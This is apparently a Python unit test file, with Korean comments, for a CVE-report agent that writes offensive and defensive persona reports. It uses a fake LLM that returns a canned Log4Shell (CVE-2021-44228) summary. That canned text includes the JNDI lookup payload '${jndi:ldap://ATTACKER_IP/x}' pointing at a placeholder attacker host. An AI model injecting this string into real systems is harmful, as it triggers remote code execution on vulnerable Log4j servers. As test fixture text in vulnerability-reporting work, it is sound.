"""Report 에이전트 + 페르소나 렌즈 — 결정론적 FakeLLM 으로 로직만 검증(라이브 Ollama 불필요).

실제 Ollama 호출로 두 페르소나가 다른 리포트를 내는지는 별도 라이브 스크립트로 확인한다.
여기서는 파싱·페르소나 프롬프트 주입 차이·실패 처리·no-op 경로를 hermetic 하게 검증한다.
"""
import unittest

from pipeline import personas
from pipeline.agents.report import report
from pipeline.state import Blackboard, PipelineContext

_GOOD = (
    "SUMMARY_EN: Log4Shell allows unauthenticated RCE via JNDI lookups; patch immediately.\n"
    "## 공격 기법\n공격자는 로그로 남는 입력에 ${jndi:ldap://ATTACKER_IP/x} 를 넣어 "
    "원격 클래스 로딩으로 RCE 를 얻습니다.\n"
    "## 완화 방안\nlog4j 2.17.1 이상으로 업그레이드하고, 그 전까지 JndiLookup 클래스를 제거합니다.\n"
)

_LOG4 = {
    "cveId": "CVE-2021-44228", "severity": "critical", "cvssScore": 10.0,
    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "types": ["CWE-917"], "products": ["Apache Log4j2"],
    "description": "Apache Log4j2 JNDI lookup remote code execution.",
}


class FakeLLM:
    """system/user 를 기록하고 미리 정한 응답을 돌려주는 가짜 LLMClient."""
    def __init__(self, response="", *, model="fake-model", raise_exc=None):
        self.response = response
        self.model = model
        self.raise_exc = raise_exc
        self.calls: list[dict] = []

    def complete(self, system, user, *, max_tokens=1400, effort="medium", model=None):
        self.calls.append({"system": system, "user": user})
        if self.raise_exc is not None:
            raise self.raise_exc
        return self.response


def _bb(persona="공격Agent"):
    bb = Blackboard(cve_id="CVE-2021-44228", persona=persona)
    bb.source_records.append({"source": "k", "kind": "primary",
                              "cveId": "CVE-2021-44228", "data": dict(_LOG4)})
    bb.validation.adopted_values = {"severity": "critical", "cvssScore": 10.0,
                                    "cvssVector": _LOG4["cvssVector"]}
    return bb


class TestPersonaResolve(unittest.TestCase):
    def test_aliases(self):
        self.assertEqual(personas.resolve_persona("공격Agent").key, "offensive")
        self.assertEqual(personas.resolve_persona("방어Agent").key, "defensive")
        self.assertEqual(personas.resolve_persona("분석가Agent").key, "analyst")
        self.assertEqual(personas.resolve_persona("defensive-bot").key, "defensive")

    def test_unknown_falls_back_to_analyst(self):
        self.assertEqual(personas.resolve_persona("무엇이든").key, "analyst")
        self.assertEqual(personas.resolve_persona(None).key, "analyst")


class TestReportParsing(unittest.TestCase):
    def test_fields_and_meta_filled(self):
        bb = _bb()
        llm = FakeLLM(_GOOD, model="exaone3.5:7.8b")
        report(bb, PipelineContext(llm=llm))
        self.assertIn("RCE", bb.report.attack)
        self.assertIn("2.17.1", bb.report.mitigation)
        self.assertTrue(bb.report.summary_en.lower().startswith("log4shell"))
        self.assertEqual(bb.report.lang, "ko+en")
        self.assertEqual(bb.report.meta["model"], "exaone3.5:7.8b")
        self.assertEqual(bb.report.meta["persona"], "offensive")
        self.assertIn("elapsed_sec", bb.report.meta)
        self.assertFalse(bb.needs_retry)

    def test_facts_include_adopted_and_description(self):
        bb = _bb()
        llm = FakeLLM(_GOOD)
        report(bb, PipelineContext(llm=llm))
        user = llm.calls[0]["user"]
        self.assertIn("CVE-2021-44228", user)
        self.assertIn("critical", user)
        self.assertIn("JNDI", user)


class TestPersonaLens(unittest.TestCase):
    def test_offensive_vs_defensive_prompts_differ(self):
        """persona 렌즈의 핵심: 같은 CVE 라도 system/user 프롬프트가 관점별로 달라야 한다."""
        off_llm, def_llm = FakeLLM(_GOOD), FakeLLM(_GOOD)
        report(_bb("공격Agent"), PipelineContext(llm=off_llm))
        report(_bb("방어Agent"), PipelineContext(llm=def_llm))
        off, dfn = off_llm.calls[0], def_llm.calls[0]
        self.assertNotEqual(off["system"], dfn["system"])
        self.assertIn("레드팀", off["system"])
        self.assertIn("블루팀", dfn["system"])
        # 강조점도 달라야 함(공격 실현성 vs 탐지·완화)
        self.assertIn("악용 경로", off["user"])
        self.assertIn("탐지", dfn["user"])


class TestReportFailure(unittest.TestCase):
    def test_llm_failure_sets_needs_retry(self):
        bb = _bb()
        llm = FakeLLM(raise_exc=TimeoutError("연결 실패"))
        report(bb, PipelineContext(llm=llm))
        self.assertTrue(bb.needs_retry)
        self.assertIn("error", bb.report.meta)
        self.assertEqual(bb.report.attack, "")  # 부분 결과 없음

    def test_no_llm_is_noop(self):
        bb = _bb()
        report(bb, PipelineContext(llm=None))
        self.assertEqual(bb.report.attack, "")
        self.assertFalse(bb.needs_retry)
        report(bb, None)  # ctx 자체가 없어도 통과
        self.assertFalse(bb.needs_retry)

    def test_unparseable_output_falls_back_to_attack(self):
        bb = _bb()
        llm = FakeLLM("형식 없는 그냥 문장입니다.")  # 두 번 다 형식 붕괴
        report(bb, PipelineContext(llm=llm))
        self.assertIn("형식 없는", bb.report.attack)  # 원문 폴백
        self.assertEqual(len(llm.calls), 2)           # 1회 재시도까지
        self.assertFalse(bb.needs_retry)              # 실패는 아님(부분 결과 있음)


if __name__ == "__main__":
    unittest.main()
